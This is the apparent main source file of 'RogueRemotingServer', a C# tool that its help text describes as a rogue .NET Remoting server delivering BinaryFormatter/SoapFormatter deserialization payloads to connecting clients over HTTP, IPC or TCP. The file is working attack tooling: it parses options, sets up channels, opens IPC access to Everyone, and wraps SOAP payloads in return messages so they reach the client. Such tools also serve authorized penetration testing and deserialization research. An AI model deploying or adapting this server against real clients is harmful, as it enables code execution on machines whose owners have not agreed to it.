using NDesk.Options;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.Remoting.Channels.Ipc;
using System.Runtime.Remoting.Channels.Tcp;
using System.Security.Principal;
using System.Text;
using System.Xml;

namespace RogueRemotingServer
{
    class Program
    {
        private static readonly string EXE = Path.GetFileName(Assembly.GetExecutingAssembly().Location);

        static void Main(string[] args)
        {
            bool showHelp = false;
            bool verbose = false;
            Format format = Format.Default;
            IDictionary properties = new Hashtable();
            bool wrapSoapPayload = false;

            OptionSet optionSet = new OptionSet
            {
                { "f|format=",
                    "message format (" + Program.GetEnumValuesAsString(typeof(Format)) + ")",
                    v => format = (Format)Enum.Parse(typeof(Format), v, true)
                },
                { "p|property={=}",
                    "channel properties (see http://msdn.microsoft.com/kw7c6kwc)",
                    (n, v) => properties.Add(n, v)
                },
                { "wrapSoapPayload",
                    "wrap SOAP payload in MethodResponse message",
                    v => wrapSoapPayload = (v != null)
                },
                { "v|verbose",
                    v => verbose = (v != null)
                },
                { "h|?|help",
                    v => showHelp = (v != null)
                }
            };
            List<string> posArgs = optionSet.Parse(args);

            if (showHelp)
            {
                WriteHelp(Console.Out, optionSet);
                Environment.Exit(0);
            }

            try
            {
                if (posArgs.Count < 1)
                {
                    throw new ArgumentException("service URI is missing");
                }
                if (posArgs.Count < 2)
                {
                    throw new ArgumentException("payload file is missing");
                }

                Uri uri = new Uri(posArgs[0]);
                UriBuilder uriBuilder = new UriBuilder(uri.Scheme, uri.Host, uri.Port, uri.LocalPath);

                if (string.IsNullOrEmpty(uriBuilder.Path) || uriBuilder.Path == "/")
                {
                    uriBuilder.Path = "/" + Guid.NewGuid().ToString();
                }
                string objectUri = uriBuilder.Path.TrimStart(new char[]
                {
                    '/'
                });

                Protocol protocol = Protocol.Unknown;
                try
                {
                    protocol = (Protocol)Enum.Parse(typeof(Protocol), uri.Scheme, true);
                    if (format == Format.Default)
                    {
                        format = ((protocol == Protocol.Http) ? Format.Soap : Format.Binary);
                    }
                }
                catch
                {
                    throw new ArgumentException("Transport " + uri.Scheme + " is not supported");
                }

                if (protocol != Protocol.Ipc)
                {
                    if (!properties.Contains("port"))
                    {
                        properties["port"] = uri.Port;
                    }
                    if (uri.IsLoopback)
                    {
                        properties["rejectRemoteRequests"] = "true";
                    }
                    if (!properties.Contains("bindTo"))
                    {
                        properties["bindTo"] = uri.Host;
                    }
                }

                byte[] payload = File.ReadAllBytes(posArgs[1]);
                if (format == Format.Soap && wrapSoapPayload)
                {
                    payload = Program.WrapSoapPayloadInReturnMessage(payload);
                }

                bool allowAnyUri = objectUri == "*";
                RogueServerChannelSinkProvider sinkProvider = new RogueServerChannelSinkProvider(protocol, allowAnyUri, format, payload);

                IChannel channel;
                switch (protocol)
                {
                    case Protocol.Http:
                        channel = new HttpServerChannel(properties, sinkProvider);
                        break;
                    case Protocol.Ipc:
                        if (!properties.Contains("authorizedGroup"))
                        {
                            properties["authorizedGroup"] = new SecurityIdentifier(WellKnownSidType.WorldSid, null).Translate(typeof(NTAccount)).ToString();
                        }
                        properties["portName"] = uri.Authority;
                        channel = new IpcServerChannel(properties, sinkProvider);
                        break;
                    case Protocol.Tcp:
                        channel = new TcpServerChannel(properties, sinkProvider);
                        break;
                    default:
                        throw new ArgumentException("Transport " + uri.Scheme + " is not supported");
                }

                bool ensureSecurity = properties.Contains("secure") && bool.Parse((string)properties["secure"]);
                ChannelServices.RegisterChannel(channel, ensureSecurity);

                if (!allowAnyUri)
                {
                    RemotingConfiguration.RegisterWellKnownServiceType(typeof(object), objectUri, WellKnownObjectMode.Singleton);
                }
                Console.WriteLine(channel.GetType().Name + " for '" + objectUri + "' created:");

                IPAddress address = null;
                if (IPAddress.TryParse(uriBuilder.Host, out address) && address.Equals(IPAddress.Any))
                {
                    foreach (NetworkInterface netInterface in NetworkInterface.GetAllNetworkInterfaces())
                    {
                        IPInterfaceProperties ipProps = netInterface.GetIPProperties();
                        foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses)
                        {
                            uriBuilder.Host = addr.Address.ToString();
                            Console.WriteLine($"  {uriBuilder}");
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"  {uriBuilder}");
                }

                if (verbose)
                {
                    Console.WriteLine("Channel properties:");
                    foreach (DictionaryEntry e in properties)
                    {
                        Console.WriteLine($"  {e.Key}={e.Value}");
                    }
                }

                Console.WriteLine();
                Console.WriteLine("Press any key to exit ...");
                Console.ReadKey();
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e);
                Environment.Exit(-1);
            }
        }

        private static void WriteHelp(TextWriter writer, OptionSet optionSet)
        {
            writer.WriteLine($"Usage:  {EXE} [OPTIONS] URL PATH");
            writer.WriteLine();
            writer.WriteLine("A rogue .NET Remoting server to deliver BinaryFormatter/SoapFormatter payloads to connecting clients.");
            writer.WriteLine();

            writer.WriteLine("Positional arguments:");
            writer.WriteLine("  URL       remoting URL");
            writer.WriteLine("  PATH      path to payload file");
            writer.WriteLine();

            writer.WriteLine("Options:");
            optionSet.WriteOptionDescriptions(writer);
            writer.WriteLine();

            writer.WriteLine("Examples:");
            writer.WriteLine($"  {EXE} --wrapSoapPayload http://0.0.0.0:12345/Foo path\\to\\raw\\payload.soap");
            writer.WriteLine($"  {EXE} ipc://NamedPipeName/Bar path\\to\\raw\\payload.bin");
            writer.WriteLine($"  {EXE} -p=secure=true tcp://0.0.0.0:12345/Baz path\\to\\raw\\payload.bin");
            writer.WriteLine();

            writer.WriteLine(".NET Remoting clients generally expect Soap for HTTP and Binary for IPC and TCP.");
        }

        private static byte[] WrapSoapPayloadInReturnMessage(byte[] payload)
        {
            string xpathBody = "/*[local-name()=\"Envelope\"]/*[local-name()=\"Body\"]";
            string xpathValue = "//*[local-name()=\"ListDictionaryInternal_x002B_DictionaryNode\"]/*[local-name()=\"value\"]";

            XmlDocument tmplDoc = new XmlDocument();
            tmplDoc.Load(GetAssemblyResourceAsStream("ReturnMessage.xml"));
            XmlElement tmplRoot = tmplDoc.DocumentElement;
            XmlElement tmplBody = (XmlElement)tmplRoot.SelectSingleNode(xpathBody);
            if (tmplBody == null)
            {
                throw new ArgumentException($"No element for XPath '{xpathBody}' found in payload!");
            }

            XmlDocument payloadDoc = new XmlDocument();
            payloadDoc.Load(new MemoryStream(payload));
            XmlNode payloadBody = payloadDoc.DocumentElement.SelectSingleNode(xpathBody);
            string firstId = null;
            foreach (var node in payloadBody.ChildNodes)
            {
                if (node is XmlElement)
                {
                    XmlElement elem = (XmlElement)node;
                    if (firstId == null && elem.HasAttribute("id"))
                    {
                        firstId = elem.GetAttribute("id");
                    }
                    tmplBody.AppendChild(tmplDoc.ImportNode(elem, true));
                }
            }

            XmlElement valueElem = (XmlElement)tmplRoot.SelectSingleNode(xpathValue);
            if (valueElem == null)
            {
                throw new Exception($"No element for XPath '{xpathValue}' found in 'ReturnMessage.xml' template!");
            }
            valueElem.SetAttribute("href", "#" + firstId);

            return Encoding.Default.GetBytes(tmplDoc.OuterXml);
        }

        private static Stream GetAssemblyResourceAsStream(string name)
        {
            return Assembly.GetExecutingAssembly().GetManifestResourceStream(nameof(RogueRemotingServer) + "." + name);
        }

        private static string GetEnumValuesAsString(Type enumType)
        {
            return string.Join(", ", Enum.GetNames(enumType));
        }
    }

    internal enum Format
    {
        Default,
        Binary,
        Soap
    }

    internal enum Protocol
    {
        Unknown,
        Http,
        Ipc,
        Tcp
    }
}
